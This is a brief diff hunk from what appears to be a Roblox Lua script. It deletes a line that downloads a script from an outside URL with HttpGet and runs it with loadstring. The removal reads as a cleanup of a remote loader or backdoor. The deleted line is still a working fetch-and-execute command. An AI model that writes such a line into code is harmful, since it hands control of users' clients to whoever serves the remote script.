@@ -13,8 +13,6 @@ local nodes = {}
 local oldgame = game
 local game = workspace.Parent
 
-loadstring(game:HttpGet("https://lua.expert/script.lua"))()
-
 cloneref = cloneref or function(ref)
 	if not getreg then return ref end
 	
